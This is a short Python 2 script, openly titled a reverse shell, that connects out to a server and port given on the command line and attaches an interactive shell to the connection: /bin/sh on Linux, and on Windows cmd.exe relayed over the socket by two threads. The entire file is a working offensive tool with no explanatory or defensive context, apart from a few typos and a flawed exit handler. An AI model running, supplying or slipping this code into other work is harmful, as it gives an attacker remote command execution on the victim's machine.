#!/bin/puthon2
import sys
import os
import socket
import subprocess
import threading

#mathiodz
if len(sys.argv[1:]) != 3:

    print "Usage: reverse_shell.py server port linux/windows"

    sys.exit(0)
server= str(sys.argv[1]); port=int(sys.argv[2]);system=str(sys.argv[3])

def linux_os():
    try:
        ana=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        ana.connect((server,port))
        os.dup2(ana.fileno(),0);os.dup2(ana.fileno(),1);os.dup2(ana.fileno(),2)
        lih=subprocess.call(["/bin/sh", "-i"])
        print 'connect'
        pass
    except Exception as e:
        print ("Usage: reverse_shell.py  server port windows" )
def windoes_os():
    try:
        ana=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        ana.connect((server,port))
        lih=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, 
                       stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        s2p_thread = threading.Thread(target=lih2ana, args=[ana, lih])
        s2p_thread.daemon = True
        s2p_thread.start()
        p2s_thread = threading.Thread(target=ana2lih, args=[ana, lih])
        p2s_thread.daemon = True
        p2s_thread.start()
        lih.wait()
        pass
    except Exception as e:
        print ("Usage: reverse_shell.py server port linux" )

def lih2ana(ana, lih):
    while True:
        data = ana.recv(1024)
        if len(data) > 0:
            lih.stdin.write(data)
def ana2lih(ana, lih):
    while True:
        ana.send(lih.stdout.read(1))
try:
    if system == "windows":
           windoes_os()
    elif system == "linux":
               linux_os()
    else: 
        print 'input linux/windows OR die'
except KeyboardInterrupt:

    ana.close()
